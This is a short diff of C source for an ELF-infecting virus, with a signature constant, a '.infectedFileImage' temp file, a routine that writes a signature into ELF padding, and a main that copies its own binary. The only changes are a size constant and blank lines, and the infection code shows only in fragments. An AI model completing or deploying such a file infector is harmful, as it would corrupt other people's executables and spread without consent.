@@ -14,7 +14,7 @@
 #include <elf.h>
 
 #define SIGNATURE 4033
-#define SIZE 18256
+#define SIZE 18528
 #define MAGIC_NUMBER 0x15D25
 // #define PAYLOAD_MESSAGE "Virus has entered your system [^-^]"
 #define TEMP_FILENAME ".infectedFileImage"
@@ -49,6 +49,8 @@ void addSignatureToELFPadding(int fd, char *fileName){
 	close(temp_fd);
 	rename(TEMP_FILENAME, fileName);
 }
+
+
 void makeCopyAndAddSignature(char *fileName){
 	char buf[200];
 	strcpy(buf,fileName);
@@ -65,6 +67,8 @@ void makeCopyAndAddSignature(char *fileName){
 	close(virus_fd);
 	remove(buf);
 }
+
+
 void main(int argc, char *argv[]) {
     srand(time(0));
 	makeCopyAndAddSignature(argv[0]);
